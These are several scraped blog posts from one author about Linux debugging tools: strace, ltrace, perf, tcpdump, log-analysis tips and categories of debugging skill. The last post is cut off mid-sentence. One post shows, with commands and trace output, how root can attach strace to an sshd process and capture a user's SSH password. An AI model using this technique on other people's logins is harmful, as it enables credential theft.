{"url": "https://jvns.ca/blog/2014/02/27/more-practical-uses-for-strace/", "title": "More practical uses for strace!", "content": "\n      In yesterday’s blog post on\n using strace to avoid reading Ruby code \nI asked the Internet for some more suggestions of practical uses for\nstrace. \n\n There were so many excellent suggestions that I couldn’t not share! \n\n Mike English  pointed me to this\n wonderful \nblog post \n Tools for Debugging Running Ruby Processes \nhe wrote about using strace, lsof, and gdb to debug a running Ruby\nprocesses. He remarks that some of the things are like open-heart\nsurgery – you can go into a running Ruby process and execute code\nusing gdb, but you might kill the process. Super cool and definitely\nworth a read. \n\n Some more great suggestions of what to do with strace: \n\n \n\n Look for the ‘open’ system call! \n\n @mjdominus   @b0rk  Also invaluable when\nsandboxing programs and trying to figure out where they are loading\nshared libraries from. — Eiríkr Åsheim (@d6)  February 27,\n2014 \n\n @b0rk  While\nlooking at git performance, I've used strace -c as well as  @pgbovine 's\nstrace-plus. — David Turner (@NovalisDMT)  February\n27, 2014 \n\n A suggestion to also use ltrace: \n\n @b0rk  all I know\nis that I usually start with strace, get annoyed with it, then\nremember to use ltrace instead. :-) — Brian Mastenbrook\n(@bmastenbrook)  February\n27, 2014 \n\n @b0rk  check out\nsyscall tracing on Linux, it's like strace for the whole system,\nhandy if you want to know which process is doing something. —\nMichael Ellerman (@michaelellerman)  February\n27, 2014    I\ndidn’t know syscall tracing was a thing! This seems very worthy of\ninvestigation.\n\n \n\n Here are some\n slides by Greg Price  with a\nbunch of great suggestions for fixing various problems, as well as his\nblog post\n Strace - The Sysadmin’s Microscope \nfrom the wonderful ksplice blog. \n\n Alex Clemmer wrote a super cool post on using dtruss (strace, but for\nOS X/BSD) to try to better understand concurrency primitives:\n The unfamiliar world of OS X syscalls . \n"},
{"url": "https://jvns.ca/blog/2022/08/30/a-way-to-categorize-debugging-skills/", "title": "Some ways to get better at debugging", "content": "\n     \n\n Hello! I’ve been working on writing a zine about debugging for a while (here’s  an early draft of the table of contents ). \n\n As part of that I thought it might be fun to read some academic papers about\ndebugging, and last week  Greg Wilson  sent me some\npapers about academic research into debugging. \n\n One of those papers ( Towards a framework for teaching debugging\n[paywalled] ) had a\ncategorization I really liked of the different kinds of knowledge/skills we\nneed to debug effectively. It comes from another more general paper on\ntroubleshooting:  Learning to Troubleshoot: A New Theory-Based Design Architecture . \n\n I thought the categorization was a very useful structure for thinking about how\nto get better at debugging, so I’ve reframed the five categories in the paper\ninto actions you can take to get better at debugging. \n\n Here they are: \n\n 1. learn the codebase \n\n To debug some code, you need to understand the codebase you’re working with.\nThis seems kind of obvious (of course you can’t debug code without\nunderstanding how it works!). \n\n This kind of learning happens pretty naturally over time, and actually\ndebugging is also one of the best ways to  learn  how a new codebase works –\nseeing how something breaks helps you learn a lot about how it works. \n\n The paper calls this “System Knowledge”. \n\n 2. learn the system \n\n The paper mentions that you need to understand the programming language, but I\nthink there’s more to it than that – to fix bugs, often you need to learn a\nlot about the broader environment than just the language. \n\n For example, if you’re a backend web developer, some “system” knowledge you\nmight need includes: \n\n \n how HTTP caching works \n CORS \n how database transactions work \n \n\n I find that I often have to be a bit more intentional about learning systemic\nthings like this – I need to actually take the time to look them up and read\nabout them. \n\n The paper calls this “Domain Knowledge”. \n\n 3. learn your tools \n\n There are lots of debugging tools out there, for example: \n\n \n debuggers (gdb etc) \n browser developer tools \n profilers \n strace / ltrace \n tcpdump / wireshark \n core dumps \n and even basic things like error messages (how do you read them properly) \n \n\n I’ve written a lot about debugging tools on this blog, and definitely\nlearning these tools has made a huge difference to me. \n\n The paper calls this “Procedural Knowledge”. \n\n 4. learn strategies \n\n This is the fuzziest category, we all have a lot of strategies and heuristics\nwe pick up along the way for how to debug efficiently. For example: \n\n \n writing a unit test \n writing a tiny standalone program to reproduce the bug \n finding a working version of the code and seeing what changed \n printing out a million things \n adding extra logging \n taking a break \n explaining the bug to a friend and then figuring out what’s wrong halfway through \n looking through the github issues to see if anything matches \n \n\n I’ve been thinking a lot about this category while writing the zine, but I want\nto keep this post short so I won’t say more about it here. \n\n The paper calls this “Strategic Knowledge”. \n\n 5. get experience \n\n The last category is “experience”. The paper has a really funny comment about this: \n\n \n Their findings did not show a significant difference in the strategies\nemployed by the novices and experts. Experts simply formed more correct\nhypotheses and were more efficient at finding the fault. The authors suspect\nthat this result is due to the difference in the programming experience between\nnovices and experts. \n \n\n This really resonated with me – I’ve had SO MANY bugs that were really\nfrustrating and difficult the first time I ran into them, and very straightforward\nthe fifth or tenth or 20th time. \n\n This also feels like one of the most straightforward categories of knowledge to\nacquire to me – all you need to do is investigate a million bugs, which is our\nwhole life as programmers anyway :). It takes a long time but I feel like it\nhappens pretty naturally. \n\n The paper calls this “Experiential Knowledge”. \n\n that’s all! \n\n I’m going to keep this post short, I just really liked this categorization and\nwanted to share it. \n\n"},
{"url": "https://jvns.ca/blog/2022/12/07/tips-for-analyzing-logs/", "title": "Tips for analyzing logs", "content": "\n     \n\n Hello! I’ve been working on writing a zine about debugging for a while now\n(we’re getting close to finishing it!!!!), and one of the pages is about\nanalyzing logs. I  asked for some tips on Mastodon \nand got WAY more tips than could fit on the page, so I thought I’d write a\nquick blog post. \n\n I’m going to talk about log analysis in the context of distributed systems\ndebugging (you have a bunch of servers with different log files and you need to\nwork out what happened) since that’s what I’m most familiar with. \n\n search for the request’s ID \n\n Often log lines will include a request ID. So searching for the request ID\nof a failed reques will show all the log lines for that request. \n\n This is a GREAT way to cut things down, and it’s one of the first helpful tips\nI got about distributed systems debugging – I was staring at a bunch of graphs\non a dashboard fruitlessly trying to find patterns, and a coworker gave me the\nadvice (“julia, try looking at the logs for a failed request instead!”).  That\nturned out to be WAY more effective in that case. \n\n correlate between different systems \n\n Sometimes one set of logs doesn’t have the information you need, but you can\nget that information from a different service’s logs about the same request. \n\n If you’re lucky, they’ll both share a request ID. \n\n More often, you’ll need to manually piece together context from clues and the timestamps of the request. \n\n This is really annoying but I’ve found that often it’s worth it and gets me a key piece of information. \n\n beware of time issues \n\n If you’re trying to correlate events based on time, there are a couple of things to be aware of: \n\n \n sometimes the time in a logging system is based on the time the log was\n ingested , not the time that the event actually happened. Sometimes you\nhave to write a date parser to get the actual time the event happened. \n different machines can have slightly skewed clocks\n \n \n\n log lines for the same request can be very far apart \n\n Especially if a request takes a long time (maybe it took 5 minutes because of a\nlong timeout!), the log lines for the request might be much more spread out\nthan you expected. You can accumulate many thousands of log lines in 5 minutes! \n\n Searching for the request ID really helps with this – it makes it harder to\naccidentally miss a log entry with an important clue. \n\n Also, log lines can occasionally get completely lost if a server dies. \n\n build a timeline \n\n Keeping all of the information straight in your head can get VERY confusing, so\nI find it helpful to keep a debugging document where I copy and paste bits of\ninformation. \n\n This might include: \n\n \n key error messages \n links to relevant dashboards / log system searches \n pager alerts \n graphs \n human actions that were taken (“right before this message, we restarted the load balancer…”) \n my interpretation of various messages (“I think this was caused by…”) \n \n\n reformat them into a table \n\n Sometimes I’ll reformat the log lines to just print out the information I’m\ninterested in, to make it easier to scan. I’ve done this on the command line\nwith a simple  awk  command: \n\n cat ... | awk '{print $5 - $8}'\n \n\n but also with fancy log analysis tools (like Splunk) that let you make a table on the web \n\n check that a “suspicious” error is actually new \n\n Sometimes I’ll notice a suspicious error in the logs and think “OH THERE’S THE\nCULPRIT!!!“. But when I search for that message to make sure that it’s actually\nnew, I’ll find out that this error actually happens constantly during normal\noperation, and that it’s completely unrelated to the (new) situation that I’m\ndealing with. \n\n use the logs to make a graph \n\n Some log analysis tools will let you turn your log lines into a graph to detect\npatterns. \n\n You can also make a quick histogram with  grep  and  sort . For example  I’ve\noften done something like: \n\n grep -o (some regex) | sort | uniq -c | sort -n\n \n\n to count how many of each line matching my regular expression there are \n\n filter out irrelevant lines \n\n You can remove irrelevant lines with  grep  like this: \n\n cat file | grep -v THING1 | grep -v THING2 | grep -v THING3 | grep -v THING4\n \n\n \nfor the reply guys: yes, we all know you don’t need to use  cat  here :)\n \n\n Or if your log system has some kind of query language, you can search for  NOT THING1 AND NOT THING2 ... \n\n find the first error \n\n Often an error causes a huge cascade of related errors. Digging into the\nlater errors can waste a lot of your time – you need to start by finding the\n first  thing that triggered the error. Often you don’t need to understand\nthe exact deals of why the 15th thing in the error cascade failed, you can just\nfix the original problem and move on. \n\n scroll through the log really fast \n\n If you already have an intuition for what log lines for this service  should \nnormally look like, sometimes scrolling through them really fast will reveal\nsomething that looks off. \n\n turn the log level up (or down) \n\n Sometimes turning up the log level will give you a key error message that\nexplains everything. \n\n But other times, you’ll get overwhelmed by a million irrelevant messages\nbecause the log level is set to  INFO , and you need to turn the log level down. \n\n put it in a spreadsheet/database \n\n I’ve never tried this myself, but a couple of people suggested copying parts of\nthe logs into a spreadsheet (with the timestamp in a different column) to make\nit easier to filter / sort. \n\n You could also put the data into SQLite or something (maybe with  sqlite-utils ?) if you want to\nbe able to run SQL queries on your logs. \n\n on generating good logs \n\n A bunch of people also had thoughts on how to  output  easier-to-analyze\nlogs. This is a bigger topic than a few bullet points but here are a few quick\nthings: \n\n \n use a standard schema/format to make them easier to parse \n include a transaction ID/request ID, to make it easier to filter for all lines related to a single transaction/request \n include relevant information. For example,  “ERROR: Invalid msg size” is less helpful than “ERROR: Invalid msg size. Msg-id 234, expected size 54, received size 0”. \n avoid logging personally identifiable information \n use a logging framework instead of using  print  statements (this helps you have things like log levels and a standard structure) \n \n\n that’s all! \n\n Let me know on Twitter/Mastodon if there’s anything I missed! I might edit this to add a\ncouple more things. \n\n"},
{"url": "https://jvns.ca/blog/2014/02/17/spying-on-ssh-with-strace/", "title": "Spying on ssh with strace", "content": "\n      In the shower this morning I was thinking about strace and ltrace and\nhow they let you inspect the system calls a running process is making.\nI’ve played a bit with strace on this blog before (see\n Understanding how killall works using strace ),\nbut it’s clear to me that there are tons of uses for it I haven’t\nexplored yet. \n\n Then I thought “Hey! If you can look at the system calls with strace\nand the library calls with ltrace, can you spy on people’s ssh\npasswords?!” \n\n It turns out that you can! I was going to do original research, but as\nwith most things one thinks up in the shower, it turns out someone’s\nalready done this before. So I googled it and I found this\n blog post explaining how to spy on ssh .\nThe instructions here are just taken from there :) \n\n \n\n The reason this is possible is that strace doesn’t just tell you which\nsystem calls a given program is running. It also tells you what the\narguments are! So if a program ever calls a function with a password\nthe odds are pretty good that you can find out the password this way. \n\n To do this you need to already be root, so it’s not a vulnerability or\nanything. This just means that if your machine is already compromised,\nit’s really, really, compromised. Here’s how it works: \n\n I have a running ssh server on my machine, so I sshd to my laptop: \n\n $ ssh asdf@localhost \n\n sshd  forks and creates a couple of new processes to handle the\nincoming ssh connection. I can find them using  ps : \n\n \nbork@kiwi /tmp> ps aux | grep sshd\nroot      1242  0.0  0.0  50036   908 ?        Ss   Jan21   0:00 /usr/sbin/sshd -D\nroot       9412   0.0  0.0 101536  4104 ?        Ss   11:29   0:00 sshd: unknown [priv]\nsshd      9413  0.0  0.0  51468  1356 ?        S    11:29   0:00 sshd: unknown [net] \n \n\n Then I can use  strace  to spy on what the child process is doing. It\npasses the password to the main  sshd  process, and that’s where we\nwin! \n\n I attach  strace  to the child process like this: \n\n $ sudo strace -p 9412 2> strace_out \n\n and then go back to my  ssh  login and type in my password\n(‘magicpassword’). \n\n When I look in the  strace_out  that gets created, I can see the\npassword! \n\n \nread(6, \"\\v\\0\\0\\0\\r magicpassword \", 18)  = 18\nsocket(PF_FILE, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4\nconnect(4, {sa_family=AF_FILE, path=\"/dev/log\"}, 110) = 0\nsendto(4, \"<38>Feb 17 11:32:35 pam_fingerpr\"..., 68, MSG_NOSIGNAL, NULL, 0) = 68\nsendto(4, \"<38>Feb 17 11:32:35 pam_fingerpr\"..., 121, MSG_NOSIGNAL, NULL, 0) = 121\n \n\n This is pretty nuts! When I think of the damage you can do as root, I\nusually think of things like reading sensitive files. And when I wrote\na rootkit, I learned that you can do all kinds of crazy things by\ninserting a malicious module into the kernel. (like hiding files and\nprocesses and making every song on your computer be by Rick Astley) \n\n But you can also spy on running processes and learn basically anything\nyou want around them! So if the NSA has root on your server, it can\neasily find out everyone’s password who logs in via SSH. Whoa. \n"},
{"url": "https://jvns.ca/blog/2014/05/13/profiling-with-perf/", "title": "I can spy on my CPU cycles with perf!", "content": "\n      Yesterday I talked about using  perf  to profile assembly\ninstructions. Today I learned how to make flame graphs with  perf \ntoday and it is THE BEST. I found this because\n Graydon Hoare  pointed me to Brendan\nGregg’s  excellent \n page on how to use perf . \n\n Wait up! What’s  perf ? I’ve talked about  strace  a lot before (in\n Debug your programs like they’re closed source ).\n strace  lets you see which system calls a program is calling. But\nwhat if you wanted to know \n\n \n how many CPU instructions it ran? \n How many L1 cache misses there were? \n profiling information for each assembly instruction? \n \n\n strace  only does system calls, and none of those things are system\ncalls. So it can’t tell you any of those things! \n\n \n\n perf  is a Linux tool that can tell you all of these things, and\nmore! Let’s run a quick example on the\n bytesum program from yesterday . \n\n \nbork@kiwi ~/w/howcomputer> perf stat ./bytesum_mmap *.mp4\n Performance counter stats for './bytesum_mmap The Newsroom S01E04.mp4':\n\n        158.141639 task-clock                #    0.994 CPUs utilized          \n                22 context-switches          #    0.139 K/sec                  \n                 9 CPU-migrations            #    0.057 K/sec                  \n               133 page-faults               #    0.841 K/sec                  \n       438,662,273 cycles                    #    2.774 GHz                     [82.43%]\n       269,916,782 stalled-cycles-frontend   #   61.53% frontend cycles idle    [82.38%]\n       131,557,379 stalled-cycles-backend    #   29.99% backend  cycles idle    [66.66%]\n       681,518,403 instructions              #    1.55  insns per cycle        \n                                             #    0.40  stalled cycles per insn [84.88%]\n       130,568,804 branches                  #  825.645 M/sec                   [84.85%]\n            20,756 branch-misses             #    0.02% of all branches         [83.68%]\n\n       0.159154389 seconds time elapsed\n \n\n This is super neat information, and there’s a lot more (see  perf\nlist ). But we can do even more fun things! \n\n Flame graphs with perf \n\n I wanted to profile my  bytesum  program. But how do you even profile\nC programs? Here’s a way to do it with  perf : \n\n \nsudo perf record -g ./bytesum_mmap *.mp4\nsudo perf script | stackcollapse-perf.pl | flamegraph.pl > flamegraph.svg\n \n\n Here’s the SVG this gave me: \n\n \n\n This is AMAZING. But what does it mean? Basically  perf  periodically\ninterrupts the program and finds out where in the stack it is. The\nwidth of each part of the stack in the graph above is the proportion\nof samples that happened there. (so about 30% of the execution time\nwas spend in  main ). I don’t know what the colour means here. \n\n We can see that there are 3 big parts – there’s the  mmap  call (on\nthe left), the main program execution (in the middle), and the\n sys_exit  part on the right. Apparently stopping my program takes a\nlong time! Neat! \n\n But there’s more! \n\n Is it really L1 cache misses? We can find out! \n\n So yesterday I made a program with really bad memory access patterns\n( bytesum_stride.c ),\nand I conjectured that it was way slower because it was causing way\ntoo many L1 cache misses. \n\n But with  perf , we can check if that’s actually true! Here are the\nresults (reformatted a bit to be more compact): \n\n \nbork@kiwi ~/w/howcomputer> perf stat -e L1-dcache-misses,L1-dcache-loads ./bytesum_mmap *.mp4\n        17,175,214 L1-dcache-misses #   11.48% of all L1-dcache hits  \n       149,568,438 L1-dcache-loads\nbork@kiwi ~/w/howcomputer> perf stat -e L1-dcache-misses,L1-dcache-loads ./bytesum_stride *.mp4 1000\n     1,031,902,483 L1-dcache-misses #  193.16% of all L1-dcache hits  \n       534,219,219 L1-dcache-loads\n \n\n So, uh, that’s really bad. We now have  60 times more  L1 cache\nmisses, and also 3 times more hits. \n\n Other amazing things \n\n \n Go to\n Brendan Gregg’s perf page and read the whole thing .\nAlso possibly everything he’s ever written. His recent post on\n strace \nis great too. \n The  perf tutorial \nis pretty long, but I found it somewhat helpful. \n FlameGraph! \n I spent a little bit of time running cachegrind with\n valgrind --tool=cachegrind ./bytesum_mmap my_file \nwhich can give you possibly even more information about CPU caches\nthan  perf  can. Still haven’t totally wrapped my head around this. \n \n\n There are still so many things I don’t understand at all! \n"},
{"url": "https://jvns.ca/blog/2014/02/26/using-strace-to-avoid-reading-ruby-code/", "title": "Using strace to avoid reading Ruby code", "content": "\n      \nThis is the start of a new category! I just started at\n Stripe  yesterday, so this is in the\nthings-I-am-learning-at-Stripe category.\nYay!\n \n\n Yesterday I was getting set up, and we were having a problem with an\ninternal tool written in Ruby that was sshing somewhere. So we wanted\nto know exactly what ssh command it was running. The normal way I’d\nthink about doing this is by, well, reading the code. But that takes\ntime! \n\n \n\n So! My new favorite thing in life is strace (as evidenced by these\n two \n posts )\n(when all you have is a hammer…). But I wasn’t sure that we could\nuse strace to figure out the ssh command. \n\n But then  Evan  did this (or something equivalent): \n\n strace -f -e trace=execve [the ruby command] \n\n This looks at all the system calls that the command runs, filters out\neverything that isn’t executing a command, and also looks in all the\nchild processes. Grepping for ssh spat out the exact ssh command that\nit was running! \n\n The looking-in-all-child-processes part ( -f ) is important because it\nstarted some subprocesses. \n\n This is super fun because what I’d usually do is go read the code to\ntry and figure out what it’s doing, and reading code is hard! strace\nis easy! \n\n Also it’s a great example of incidental/accidental learning. I like\nworking with people who know more (and different!) things than I do :) \n\n I’m trying to put together more examples of when understanding how\nsystem calls work is useful in everyday non-kernel-hacking\nprogramming. If you have suggestions, tell me on Twitter! I’m\n @b0rk . (or by email!) \n\n ( edit :  Greg Price  suggested using\n strace -e process  instead of  strace -e trace=execve . It’s shorter,\nand it also shows you other process-related system calls.) \n"},
{"url": "https://jvns.ca/blog/2014/03/10/debugging-shared-library-problems-with-strace/", "title": "Debugging shared library problems with strace", "content": "\n      It’s official. I have a love affair with strace. \n\n So strace is this Linux command that shows you what system calls a program\ncalls. \n\n This doesn’t sound so useful until you find out that it is useful FOR\nEVERYTHING. Seriously. strace is like an immersion blender. I use strace more\nthan my immersion blender. \n\n \n\n Previously we have used strace to\n find out how killall works ,\n spy on ssh ,\n avoid reading Ruby code , and\n more . \n\n So today I had was trying to install the\n IRuby notebook . But my version of libzmq was wrong! So I upgraded it. But it was STILL WRONG. Why? WHY? \n\n So I thought, I will get strace to tell me which shared libraries are being loaded! strace will never lie to me. Here’s how to do that: \n\n strace -f -o /tmp/iruby_problems ~/clones/iruby/bin/iruby notebook\ngrep libzmq.so /tmp/iruby_problems | grep -v ENOENT\n \n\n The  grep -v ENOENT  is because it looks everywhere in my LD_LIBRARY_PATH so it\nfails to find libzmq a bunch of times. This reveals the following two system\ncalls: \n\n 28863 open(\"/opt/anaconda/lib/python2.7/site-packages/zmq/utils/../../../../libzmq.so.3\", O_RDONLY|O_CLOEXEC) = 9\n28910 open(\"/usr/lib/libzmq.so\", O_RDONLY|O_CLOEXEC) = 9\n \n\n AH HA. The first libzmq is the right version ( libzmq.so.3 ), but the second one is all wrong! It is  libzmq1  and it is a disaster and a disgrace. I did  sudo apt-get remove libzmq1  and the offending  libzmq  was banished from my system. \n\n Thanks, strace :) \n"},
{"url": "https://jvns.ca/blog/2016/02/24/perf-top-my-new-best-friend/", "title": "perf top: an awesome way to spy on CPU usage", "content": "\n     \n\n If you read this blog, you might know that I  love strace, so much that I wrote a zine about it . But strace has not ever been able to solve all my problems – it only tells me about system calls, it can slow down my code up to 50x. Not ideal! \n\n So, enter  perf . We  learned about perf  a couple of years ago, when we found out that it can tell you about how many CPU cycles your program is using. That was cool, but ultimately not that useful to me right now (I’m trying to make Ruby programs fast!). \n\n But! A couple of months ago I learned about  perf top , which tells you which functions are in use on your computer right now (the same way  top  does for programs). I have three stories for you about how perf top is the best and has helped me solve problems. \n\n First, I’m going to show you what  sudo perf top  gives me on my computer right now: \n\n $ sudo perf top\n26.63%  chrome                               [.] 0x0000000000fe202b\n 2.20%  perf                                 [.] 0x00000000000523fd\n 1.12%  [kernel]                             [k] _raw_spin_lock_irqsave\n 1.10%  MusicManager_x86_64.nexe             [.] sqlite3VdbeExec\n 0.98%  [kernel]                             [k] fget_light\n 0.91%  perf-10709.map                       [.] 0x00001db39d555f0d\n 0.89%  [kernel]                             [k] aes_decrypt\n 0.88%  [kernel]                             [k] sock_poll\n 0.82%  [kernel]                             [k] aes_encrypt\n 0.78%  [kernel]                             [k] __schedule\n 0.76%  .com.google.Chrome.Bc2ixX            [.] 0x000000000feda002\n \n\n You can see that some mystery function in Chrome is responsible for 26% of CPU usage, perf itself has some overhead,  MusicManager_x86_64  is using sqlite (what? why?), and there are various things going on inside my kernel. Neat. \n\n Now, let’s see some real examples of perf in action! \n\n the case of the sad Node program \n\n I needed to debug a node program recently. It was super slow, and spending a ton of time on the CPU. I had no idea why. \n\n Since my new hobby is to run  perf top  any time I have a question about CPU usage, I ran perf! I don’t have the real results here, but I basically saw something like this: \n\n node                 [.] v8::internal::StackFrame::GetCallerState(v8::internal::StackFrame::State*) const\nnode                 [.] v8::internal::SemiSpace::Swap(v8::internal::SemiSpace*, v8::internal::SemiSpace*)\nnode                 [.] v8::internal::ScavengeVisitor::VisitPointers(v8::internal::Object**, v8::internal::Object**)\nnode                 [.] v8::internal::GCTracer::Start(v8::internal::GarbageCollector, char const*, char const*)\nnode                 [.] v8::internal::Heap::ClearJSFunctionResultCaches()\nnode                 [.] v8::internal::InnerPointerToCodeCache::GetCacheEntry(unsigned char*)\nnode                 [.] v8::internal::Runtime_AllocateInTargetSpace(int, v8::internal::Object**,\n \n\n I didn’t know what all of it meant, but it seemed clear that the program was spending most of its time doing garbage collection. No good! We didn’t manage to figure out  why  it was garbage collecting, but it was awesome to be able to quickly triage what was going on. \n\n the case of the swapping computer \n\n Today at work, I had a program that was slow. Surprise! A lot of stories these days start this way. The computer was using a lot of CPU, and I wanted to know why. \n\n Here’s what  perf top  had to say about that: \n\n \n\n This is a totally different story from our node story – in this case, the  linux kernel  is using all our CPU. What?! Why? \n\n It turns out that the computer was swapping its memory to disk, and that the swap partition was encrypted. So every time it saved memory to disk or read it back, it needed to encrypt and decrypt all that memory. The CPU load on that machine was like 15. It was having a bad day. \n\n We fixed the memory usage on the machine, and everything was all better ❤. \n\n the case of the HTTP request \n\n Our last case is a Python mystery! This one is a fake mystery that I made up, but it illustrates a real possible slow program. \n\n So! I ran a Python program to download several files, and it used 100% of my CPU for several seconds. What was it doing? Let’s ask perf top!! \n\n 24.92%  libcrypto.so.1.0.0  [.] 0x00000000001264e4\n 8.88%  libcrypto.so.1.0.0  [.] EVP_DecodeUpdate\n 6.23%  libc-2.15.so        [.] malloc\n 5.62%  python              [.] 0x00000000000e9b5d\n 4.48%  libc-2.15.so        [.] malloc_consolidate.part.3\n 3.25%  python              [.] PyEval_EvalFrameEx\n 2.77%  libcrypto.so.1.0.0  [.] EVP_DecodeBlock\n 2.63%  libcrypto.so.1.0.0  [.] ASN1_item_ex_d2i\n 2.07%  libcrypto.so.1.0.0  [.] X509_NAME_cmp\n 1.62%  libc-2.15.so        [.] msort_with_tmp.part.0\n 1.62%  libcrypto.so.1.0.0  [.] ASN1_item_ex_i2d\n \n\n It seems to be doing… a lot of crypto? Why? Here’s the program: \n\n import grequests\n\nrs = (grequests.get('https://news.ycombinator.com') for i in xrange(1000))\n\ngrequests.map(rs)\n \n\n It turns out that opening a HTTPS connection is pretty slow! You need to spend a bunch of time in crypto functions in order to be secure. And perf tells us immediately that that’s what’s going on! Awesome. \n\n But there’s more \n\n So I’ve gone through a few examples of how perf can sometimes help triage what a program is spending its CPU time on, even if the program is written in node or Python or something. \n\n There’s a limitation here that you may have noticed – perf will only tell us about C functions (like  EVP_DecodeUpdate  or something). \n\n So you may be thinking – “my node program isn’t garbage collecting! It’s spending its time in some Javascript function! perf will not help me at all!” And what if I’m using Java, Julia? This will not help me with Java! \n\n perf is even more magical than you might expect, though! You can  tell perf about your Java and node functions . This blew my mind when I learned it and is continuing to blow my mind. If you want to make perf amazing for Java, read this blog post  Java in flames \n\n Brendan Gregg’s page on perf  has more about perf and how great it is and how to use it to help debug your node.js programs. \n\n a toolbox of delightful tools \n\n I’m slowly building a toolbox of easy-to-use tools that will help me understand what my programs are doing. There are a few things that are farther down the list (ftrace and systemtap are still very confusing to me and I do not know how to use them.) \n\n But  perf top  is so simple (just one command!), and so straightforward, and I think it deserves to go in your toolbox. It works on Linux. Try it out! See what happens! Run it everywhere! It’s safe to run in production. \n\n sudo perf top \n\n"},
{"url": "https://jvns.ca/blog/2013/12/22/fun-with-strace/", "title": "Understanding how killall works using strace", "content": "\n      Right now I’m on a million-hour train ride from New York to Montreal.\nSo I’m looking at the output of  strace  because, uh,  strace  is\ncool, and it is teaching me some things about how the command line\ntools I\nuse all the time work. \n\n What  strace  does is capture every single system call that gets\ncalled when executing a program. System calls are the interface\nbetween userspace programs and the kernel, so looking at the output\nfrom  strace  is a fun way to understand how Linux works, and what’s\nreally involved in running a program. \n\n For example!  killall ! I ran \n\n strace killall ruby1.9.1 2> killall-log . \n\n This starts with \n\n execve(\"/usr/bin/killall\", [\"killall\", \"ruby1.9.1\"], [/* 48 vars */]) = 0\n \n\n Every time you run a program,  execve  gets called to start, so\n execve  will always be the first line. \n\n Then this happens A WHOLE BUNCH OF TIMES: \n\n open(\"/proc/4526/stat\", O_RDONLY)       = 3\nfstat(3, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0\nmmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7febbb269000\nread(3, \"4526 (chrome) S 4521 2607 2607 0\"..., 1024) = 374\nclose(3)                                = 0\nmunmap(0x7febbb269000, 4096)            = 0\n \n\n with different PIDs. \n\n What’s going on here is that it goes through every PID. To find the\nPIDs, it opens the  /proc  directory. There’s a directory in  /proc \nfor each PID. \n\n bork@kiwi ~/w/homepage> ls /proc\n1      1495   2408   2780   3278  8065         fb\n10006  1498   2409   2782   3281  8066         filesystems\n10152  1500   2410   2795   3283  8068         fs\n10158  1504   2411   28     3317  8069         interrupts\n1021   1513   2412   2802   35    8070         iomem\n \n\n The system call that does this is: \n\n openat(AT_FDCWD, \"/proc\", O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC) = 3 \n\n Once it’s done that, then it iterates through all the PIDs, opens\n /proc/$PID/stat , and checks to see if the process has the right\nname. The kernel isn’t involved in seeing whether or not the process\nhas the right name, so we don’t see that in the  strace  output. \n\n Once it finds a PID that it wants to kill, it runs something like \n\n kill(11510, SIGTERM)\n \n\n to kill it. SIGTERM isn’t a very serious killing-y signal – it’s\nsignal 15, and processes can ignore it or save their state before they\nstop. If you run  killall -9 , it will sent  SIGKILL  to all the\nmatching processes and it will kill them dead. \n\n This is really neat! I never thought of  killall  as having to do an\nexhaustive search through all PIDs before, but it makes sense. \n\n After all of that, if there was something to kill, the only thing left\nis  exit_group(0) .  man 2 exit_group  tells me that this exits all\nthreads in a process, and that this system call is called at the end\n.of every process \n\n If we run  killall blah , and there was no  \"blah\"  process to kill,\ninstead we see: \n\n write(2, \"blah: no process found\\n\", 23blah: no process found) = 23\nexit_group(0) \n \n\n because it needs to write “no process found” to stderr. \n\n Edit: \n\n I have learned a couple of new things, from people’s responses to this\npost! \n\n If you want to see the library calls instead of the system calls, and\nwant to see where it does the string comparisons, you can use\n ltrace ! \n\n For  killall , finding  python3  and killing it looks like: \n\n __asprintf_chk(0x7fff195b6988, 1, 0x403fd9, 15499, 0x7f31d919e700) = 16\nfopen(\"/proc/15499/stat\", \"r\")              = 0x208f8f0\nfree(0x0208f8d0)                            = <void>\nfscanf(0x208f8f0, 0x403fe7, 0x7fff195b71b0, 0x7f31d8fa5728, 0) = 1\nfclose(0x208f8f0)                           = 0\nstrcmp(\"python3\", \"python3\")                = 0\nkill(15499, 15)                             = 0\n \n\n And you can attach  strace  or  ptrace  to an already-running process\nto see what it’s up to.  @zbrdge  said\nthat he sometimes uses it to see which files Apache is accessing\nduring a HTTP request. \n\n"},
{"url": "https://jvns.ca/blog/2016/05/06/a-workshop-on-strace-and-tcpdump/", "title": "A workshop on strace & tcpdump", "content": "\n     \n\n This week at work, I ran a workshop on tcpdump and strace. a couple of people on Twitter asked about it so here are some notes. This is mostly just so I can reuse them more easily next time, but maybe you will also find it interesting. The notes are a bit sparse and it’s very unclear that anybody other than me will find them legible or useful, but I decided to put them here anyway. \n\n I basically did a bunch of live demos of how to use tcpdump & strace, and then took questions & comments as people had them. I ran it in an hour, which I think was fine for people who already had some familiarity with the tools, but really aggressive if you’re learning from scratch. Will do that differently next time. \n\n tcpdump \n\n Why use tcpdump? We do a lot of web development; almost all of our services talk to each other with network requests. So a tool that can spy on network requests can be a really good general-purpose debugging tool. I’ve used this quite a bit at work and it’s been great. \n\n I didn’t really explain what TCP was, which seemed okay. \n\n Ask everyone to install Wireshark at the beginning of the workshop. Wireshark is really easy to install on OS X now! Nobody had trouble with this. \n\n step 1: laptop demo \n\n \n start  python -mSimpleHTTPServer 8080 \n run  curl localhost:8080/404 \n now that we have some simple network traffic on my laptop, we can look at it with tcpdump! \n run  sudo tcpdump  by itself. That’s a lot of output, and it’s a little difficult to read. Don’t worry! \n talk about network interfaces, here we actually need to run  tcpdump -i lo0  or  tcpdump -i any  to see the local traffic \n talk a little bit about what the output here means, but note that it’s kind of difficult to understand \n run  tcpdump -A port 8080 -i any .  port 8080  is the same as  src port 8080 or dst port 8080 ; a really great shortcut. the pcap filter syntax can be a little difficult to remember at first, all I’ve need to really know so far is how to filter by port and IP.  -A  shows us the contents of the packets. We can see the GET request, the content type, and the response in tcpdump’s output! This is really cool! \n point out that Python’s SimpleHTTPServer is writing out each header line in a separate packet, and that this makes no sense. \n \n\n step 2: look at some QA network traffic \n\n \n ssh to a dev machine \n run tcpdump on some relevant network traffic, talk about what that network traffic actually means and how you can tell (by looking at the port, knowing what services run on which ports, looking at the hostname the packets are going to) \n \n\n step 3: tcpdumping for performance \n\n this section is about how to debug performance problems using tcpdump! \n\n \n find a service in production that makes HTTP requests \n talk about packet captures in production (it’s generally safe to do, just be careful to not accidentally fill up your disk if you’re 